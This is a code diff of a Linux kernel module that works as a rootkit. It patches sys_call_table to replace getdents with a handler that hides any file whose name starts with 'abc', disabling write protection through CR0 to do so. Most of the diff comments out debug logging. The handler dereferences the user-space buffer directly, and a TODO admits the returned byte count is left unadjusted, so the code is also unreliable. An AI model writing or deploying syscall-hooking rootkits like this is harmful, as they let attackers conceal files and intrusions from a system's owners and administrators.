@@ -34,41 +34,37 @@ MODULE_LICENSE("GPL");
 
 unsigned long *syscall_table = (void *)0xffffffff81e001a0;
 
+asmlinkage int (*original_getdents) (unsigned int, struct dirent_  *, unsigned int);
 
-asmlinkage int (*original_getdents) (unsigned int, struct dirent_ __user *, unsigned int);
-
-asmlinkage int custom_getdents(unsigned int fd, struct dirent_ __user *entries, unsigned int count) {
+asmlinkage int custom_getdents(unsigned int fd, struct dirent_  *entries, unsigned int count) {
 	
 	char check[5] = "abc";
 	struct dirent_ *dEntryPtr;
 	//dEntryPtr = entries;
 	long bytes_read;
 
-	printk(KERN_ALERT "Count before: %d\n", count);
+	//printk(KERN_ALERT "Count before: %d\n", count);
 	bytes_read = original_getdents(fd, entries, count);
 
 	if(bytes_read <= 0) {
 		return 0;
 	}
         	
-	printk(KERN_ALERT "Bytes read: %d\n", bytes_read);
+	//printk(KERN_ALERT "Bytes read: %d\n", bytes_read);
 	char* dbuf;
 	dbuf = (char*) entries;
 	int boff=0;
 	
-	printk(KERN_ALERT "%ld %ld %ld\n", (unsigned long) dbuf, (unsigned long)(dbuf + bytes_read), bytes_read);
+	//printk(KERN_ALERT "%ld %ld %ld\n", (unsigned long) dbuf, (unsigned long)(dbuf + bytes_read), bytes_read);
 	
 
 	// read all loop
 	for(boff = 0; boff < bytes_read;){
 		dEntryPtr = (struct dirent_*) (dbuf + boff);
-		printk(KERN_ALERT "dbuf + boff %ld\n", (unsigned long)(dbuf+boff));
-		//printk(KERN_ALERT "Reclen: %d\n", dEntryPtr -> d_reclen);
-		//printk(KERN_ALERT "Size: %d\n", sizeof(*dEntryPtr)); 
-		printk(KERN_ALERT "File: %s\n", dEntryPtr->d_name);
-		printk(KERN_ALERT "reclen: %ld, sizeof struct %ld\n", (unsigned long)dEntryPtr->d_reclen, (unsigned long)sizeof(*dEntryPtr));
-		printk(KERN_ALERT "boff %ld < bytes read %ld\n", (unsigned long) boff, (unsigned long) bytes_read);
-		printk(KERN_ALERT "%ld %ld %ld\n",(unsigned long) dbuf + boff,(unsigned long) dbuf + boff + dEntryPtr->d_reclen, (unsigned long)bytes_read - (boff + dEntryPtr->d_reclen));
+		//printk(KERN_ALERT "File: %s\n", dEntryPtr->d_name);
+		//printk(KERN_ALERT "reclen: %ld, sizeof struct %ld\n", (unsigned long)dEntryPtr->d_reclen, (unsigned long)sizeof(*dEntryPtr));
+		//printk(KERN_ALERT "boff %ld < bytes read %ld\n", (unsigned long) boff, (unsigned long) bytes_read);
+		//printk(KERN_ALERT "%ld %ld %ld\n",(unsigned long) dbuf + boff,(unsigned long) dbuf + boff + dEntryPtr->d_reclen, (unsigned long)bytes_read - (boff + dEntryPtr->d_reclen));
 		//if(strstr(dEntryPtr->d_name, check) != NULL) {	
 		if(strlen(dEntryPtr->d_name) >=3 && dEntryPtr->d_name[0]=='a' && dEntryPtr->d_name[1]=='b' && dEntryPtr->d_name[2] == 'c'){
 			copy_to_user(dbuf + boff, dbuf + boff + dEntryPtr -> d_reclen, bytes_read - (boff + dEntryPtr -> d_reclen));
@@ -78,16 +74,20 @@ asmlinkage int custom_getdents(unsigned int fd, struct dirent_ __user *entries, 
 			boff += dEntryPtr->d_reclen;
 		}
 		
-		printk(KERN_ALERT "Bytes read-loop: %d\n", bytes_read);
+		//printk(KERN_ALERT "Bytes read-loop: %d\n", bytes_read);
 	}
-	printk(KERN_ALERT "Count: %d\n", count);
+	//printk(KERN_ALERT "Count: %d\n", count);
 		
-	printk(KERN_ALERT "Bytes read: %d\n", bytes_read);
+	//printk(KERN_ALERT "Bytes read: %d\n", bytes_read);
 	// TODO: identify abc prefix entries, remove them from entries by shifting following entries and adjusting bytes read
 
-	printk(KERN_ALERT "~~~~~~~~~~~~~~~~~~~~~~~~~");
+	//printk(KERN_ALERT "~~~~~~~~~~~~~~~~~~~~~~~~~");
 	return bytes_read;	
 }
+
+
+
+
 
 int make_rw(unsigned long *address) {
 	printk(KERN_ALERT "Ho ho\n");
@@ -136,17 +136,17 @@ int set_page_rw(long unsigned int _addr)
    return change_page_attr(pg, 1, prot);
 }*/
 
-__init int init_module()
+__init int init_module(void)
 {
     // sys_call_table address in System.map
     //sys_call_table = (unsigned long *)ffffffff81e001a0;
-    printk(KERN_ALERT "Entering the init_module with the address %p\n", (void *) syscall_table);
-    printk(KERN_ALERT "Next: %p\n", syscall_table);
+    //printk(KERN_ALERT "Entering the init_module with the address %p\n", (void *) syscall_table);
+    //printk(KERN_ALERT "Next: %p\n", syscall_table);
 
     p_sys_call_table = (void *) kallsyms_lookup_name("sys_call_table");
-    if(NULL != p_sys_call_table) {
+    /*if(NULL != p_sys_call_table) {
     	printk(KERN_ALERT "Yay! The address is %p\n", *p_sys_call_table);
-    }
+    }*/
 
     /*make_rw((unsigned long *)p_sys_call_table);
     
@@ -177,12 +177,14 @@ __init int init_module()
     // we now overwrite the syscall
     p_sys_call_table[__NR_getdents] = (unsigned long *) custom_getdents;
     write_cr0(original_cr0);
-    printk(KERN_ALERT "Patched! syscall number : %d\n", __NR_getdents);
+    //printk(KERN_ALERT "Patched! syscall number : %d\n", __NR_getdents);
+
+    
 
     return 0;
 }
 
-void cleanup_module()
+void cleanup_module(void)
 {
    /* Restore the original call
    make_rw((unsigned long *) p_sys_call_table);
